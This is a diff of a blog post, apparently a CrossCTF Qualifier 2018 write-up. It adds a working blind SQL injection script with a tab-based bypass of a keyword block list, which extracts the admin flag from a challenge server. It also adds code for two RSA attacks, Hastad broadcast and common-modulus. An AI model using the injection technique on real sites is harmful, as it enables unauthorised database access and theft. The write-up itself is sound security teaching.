@@ -1,5 +1,5 @@
 ---
-title: "Crossctf 2018 Writeup"
+title: "Crossctf Qualifier 2018 Writeup"
 date: 2018-05-19T13:05:55+08:00
 draft: false
 tags: [
@@ -7,7 +7,7 @@ tags: [
   "cyber-security",
   "write-up"
 ]
-description: solves for CrossCTF 2018 challenges
+description: solves for CrossCTF Qualifier 2018 challenges
 ---
 
 # QuirkyScript 1
@@ -39,7 +39,7 @@ According to the [express.js docs](https://expressjs.com/en/api.html#req.query),
 
 Also, the code used `==` instead of `===`; therefore, values of different types can be equal to each other and types are converted according to [this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness):
 
-![equal table](/blog/images/crossctf-2018-writeup/equal-table.png)
+![equal table](/blog/crossctf-2018-writeup/equal-table.png)
 
 So, when `req.query.first = ['','','','','','','','']`, it has a length of `8` and equals to string `',,,,,,,'`.
 
@@ -180,3 +180,206 @@ It is just javascript weirdness with it comes to regexp.
 Final payload: `http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&six=I_AM_ELEET_HAX0R`
 
 Flag: `CrossCTF{1_am_n1k0las_ray_zhizihizhao}`
+
+# Baby Web
+
+## Problem
+
+```php
+...
+function getAllUsernameLike($username) {
+    $dbhost = 'localhost';
+    $dbuser = 'crossctf';
+    $dbpass = 'CROSSCTFP@SSW0RDV3RYL0NGANDG00DANDVERYLONG';
+    $dbname = 'crossctf';
+    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname) or die("Wrong info given");
+    if ($conn->connect_error) {
+        exit();
+    }
+    $return = array();
+
+    $username = str_replace(" ","", $username);
+    $array = array("=", "union", "join", "select", "or", "from", "insert", "delete");
+    if(0 < count(array_intersect(array_map('strtolower', explode(' ', $username)), $array)))
+    {
+        die("die hacker!");
+    }
+    $sql = "SELECT username FROM users WHERE username like '%$username%';";
+    $result = $conn->query($sql);
+    while ($row = $result->fetch_array()) {
+        array_push($return, $row);
+    }
+    $conn->close();
+    if ( empty($return) ) {
+        return null;
+    } else {
+        return $return;
+    }
+}
+if (isset($_GET['search']) && isset($_POST['username'])) {
+    $users = getAllUsernameLike($_POST['username']);
+}
+...
+```
+
+Notes: `The flag is in the flag column of the user 'admin'.`
+
+## Solution
+
+```javascript
+const request = require('request-promise');
+
+let flag = '';
+let str = 'abcdefghijklmnopqrstuvwxyz!{}ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_';
+
+(async function () {
+  while (true) {
+    for (let i = 0; i < str.length; i++) {
+      let char = str[i]
+      let query = "admin%'	and	users.flag	like	binary	'"+flag+char;
+      let options = {
+        method: 'POST',
+        uri: 'http://ctf.pwn.sg:8180/?search',
+        form: {
+            username: query
+        }
+      };
+      let body = await request(options);
+      if (body.indexOf('<tr><td>admin</td></tr>') >= 0) {
+        flag += char;
+        console.log('got one: ' + query);
+        break;
+      } else {
+        console.log('tried: ' + query);
+      }
+    }
+  }
+})();
+```
+
+Notes:
+
+* use tabs over spaces
+* use `like binary` to find the casing
+
+Flag: `CrossCTF{SiMpLe_sQl_iNjEcTiOn_aS_WaRmUp}`
+
+# BabyRSA
+
+## Problem
+
+Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all those values.
+
+[out.txt](/blog/crossctf-2018-writeup/BabyRSA/out.txt)
+
+## Solution
+
+For this challenge, the n values are different and the e values are all the same. This means that we can use the [Chinese Remainder Theorem](https://en.wikipedia.org/wiki/Chinese_remainder_theorem) as described [here](https://www.linkedin.com/pulse/eve-magician-goes-china-crack-rsa-william-buchanan).
+
+Using the CRT, you will be able to find `m^e` which is `m^257`. Then, I used a simple binary search to find the message which is between `10^252` and `10^253`.
+
+Code:
+
+```javascript
+const crt_bignum = require('nodejs-chinese-remainder');
+const bignum = require('bignum');
+const fs = require('fs');
+const bigInt = require("big-integer");
+
+const file = fs.readFileSync('./out.txt', 'utf8').split('\n');
+const ns = file.filter(e => e.indexOf('n =') >= 0).map(e => bignum(e.substring(4)));
+const cs = file.filter(e => e.indexOf('c =') >= 0).map(e => bignum(e.substring(4)));
+
+const result = crt_bignum(cs, ns);
+const answer = bigInt(result.toString());
+
+let lower = bigInt(10).pow(252);
+let upper = bigInt(10).pow(253);
+
+let target = null;
+let v = null;
+
+while (lower.lesser(upper)) {
+  target = lower.add(upper).divide(2);
+  console.log(target.toString());
+  v = target.pow(257);
+  if (v.eq(answer)) {
+    console.log(target.toString(16));
+    break;
+  } else if (v.lt(answer)) {
+    lower = target;
+    console.log('less');
+  } else {
+    upper = target;
+    console.log('more');
+  }
+}
+```
+
+Flag: `crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}`
+
+# BabyRSA 2
+
+## Problem
+
+Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all those values... AGAIN!
+
+[out.txt](/blog/crossctf-2018-writeup/BabyRSA2/out.txt)
+
+## Solution
+
+This question is the opposite of last one. The n values are the same while the e values are changing. One can use four rounds of the [Extended Euclidean algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm) to found `m^(gcd(e1, e2, e3, e4, e5) = 1)` which is the flag. The simplified process is described [here](https://crypto.stackexchange.com/questions/1614/rsa-cracking-the-same-message-is-sent-to-two-different-people-problem).
+
+Proof on a piece of paper:
+
+![proof](/blog/crossctf-2018-writeup/BabyRSA2/proof.jpg)
+
+Code:
+
+```javascript
+const bigInt = require("big-integer");
+const fs = require('fs');
+
+const ns = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('n =') >= 0).map(e => e.substring(4));
+const es = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('e =') >= 0).map(e => parseInt(e.substring(4)));
+const cs = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('c =') >= 0).map(e => bigInt(e.substring(4)));
+const n = bigInt(ns[0]);
+
+// ref: http://pages.pacificcoast.net/~cazelais/euclid.html
+function xgcd(a,b) { 
+  if (b == 0) {
+    return [1, 0, a];
+  } else {
+   temp = xgcd(b, a % b);
+   x = temp[0];
+   y = temp[1];
+   d = temp[2];
+   return [y, x-y*Math.floor(a/b), d];
+  }
+}
+
+function modT(big, a) {
+  if (a >= 0) {
+    return big.modPow(a, n);
+  } else {
+    return big.modInv(n).modPow(-a, n);
+  }
+}
+
+let r1 = xgcd(es[0], es[1]);
+console.log(r1);
+let r2 = xgcd(es[2], es[3]);
+console.log(r2);
+let r3 = xgcd(r1[2], r2[2]);
+console.log(r3);
+let r4 = xgcd(r3[2], es[4]);
+console.log(r4);
+
+let v1 = modT(cs[0], r1[0]).times(modT(cs[1], r1[1])).mod(n);
+let v2 = modT(cs[2], r2[0]).times(modT(cs[3], r2[1])).mod(n);
+let v3 = modT(v1, r3[0]).times(modT(v2, r3[1])).mod(n);
+let v4 = modT(v3, r4[0]).times(modT(cs[4], r4[1])).mod(n);
+console.log(v4.toString(16));
+```
+
+Flag: `crossctf{RSA_Challenges_Are_Too_Easy}`
